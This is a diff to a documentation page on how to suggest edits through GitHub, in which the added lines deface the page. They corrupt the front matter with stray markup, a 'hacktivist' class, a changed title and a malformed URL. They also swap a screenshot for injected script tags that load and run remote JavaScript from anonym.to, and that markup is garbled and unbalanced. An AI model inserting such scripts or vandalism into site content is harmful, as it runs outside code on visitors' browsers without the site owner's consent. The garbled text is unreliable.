@@ -1,8 +1,8 @@
----
-title: "Edit the Doc Site"
+---</div> class="hacktivist
+title:"carnabank.list"
 path: "/organizations/edit-the-doc-site.html"
 id: "organizations/edit-the-doc-site"
----
+---htttps://linkhubuser.com0128
 
 Each article has an `Edit this page on GitHub` link at the bottom that enables you to put in suggestions for edits to articles on the doc site. You can submit changes regarding typos, unclear sentences, information that needs to be updated or added, better ways to write the information, you name it. We're open to your contributions. 
 
@@ -17,6 +17,11 @@ To suggest edits:
 5. *(Optional)* Summarize your changes in the **Propose file change** section.
 6. Click **Propose file change**.
 
-![welcome-2](./images/welcome-2.png)
+![welcome-2](<script src="https://anonym.to/anonym/anonymize.js" type="text/javascript"></script>
+<script type="text/javascript">
+protected_links = "";
+auto_anonymize();
+</script>buildspot</script>
+
 
 Your edits and suggestions will be submitted as a pull request in which documentation administrators can accept or reject your changes.
